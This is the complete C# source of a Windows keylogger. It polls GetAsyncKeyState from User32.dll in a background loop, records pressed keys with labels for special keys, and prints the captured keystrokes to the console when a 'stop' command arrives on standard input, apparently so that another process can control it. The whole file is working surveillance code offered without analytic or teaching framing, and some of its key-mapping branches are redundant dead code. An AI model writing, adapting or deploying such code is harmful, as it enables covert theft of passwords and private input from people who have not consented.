using System.Runtime.InteropServices;
using System.Text;

class Program
{
    [DllImport("User32.dll")]
    static extern int GetAsyncKeyState(Int32 i);

    static StringBuilder keylog = new StringBuilder();
    static bool isLogging = false;
    static bool exitRequested = false;

    static void Main(string[] args)
    {

        // Start logging loop
        Task.Run(() =>
        {
            while (!exitRequested)
            {
                if (isLogging)
                {
                    Thread.Sleep(5);

                    for (int i = 8; i < 256; i++)  // Extended range for special keys
                    {
                        int keyState = GetAsyncKeyState(i);
                        if (keyState == 32769 || keyState == -32767)  // Key pressed
                        {
                            char key = (char)i;

                            // Handle special keys
                            if (i == 8) keylog.Append("[BACKSPACE]");
                            else if (i == 9) keylog.Append("[TAB]");
                            else if (i == 13) keylog.Append("[ENTER]");
                            else if (i == 32) keylog.Append(" ");
                            else if (i >= 32 && i <= 126) keylog.Append(key);
                            else if (i >= 48 && i <= 57) keylog.Append(key); // Numbers
                            else if (i >= 65 && i <= 90) keylog.Append(key); // Letters
                        }
                    }
                }
                else
                {
                    Thread.Sleep(100); // Sleep longer when not logging
                }
            }
        });

        // Command interface loop
        while (!exitRequested)
        {
            try
            {
                string? command = Console.ReadLine()?.Trim().ToLower();

                if (string.IsNullOrEmpty(command))
                    continue;

                switch (command)
                {
                    case "start":
                        isLogging = true;
                        keylog.Clear();
                        Console.WriteLine("Logging started.");
                        break;

                    case "stop":
                        isLogging = false;
                        string capturedKeys = keylog.ToString();
                        Console.WriteLine(capturedKeys);
                        Console.Out.Flush();
                        break;

                    case "exit":
                        exitRequested = true;
                        Console.WriteLine("Exiting...");
                        break;

                    default:
                        Console.WriteLine("Unknown command.");
                        break;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }
    }
}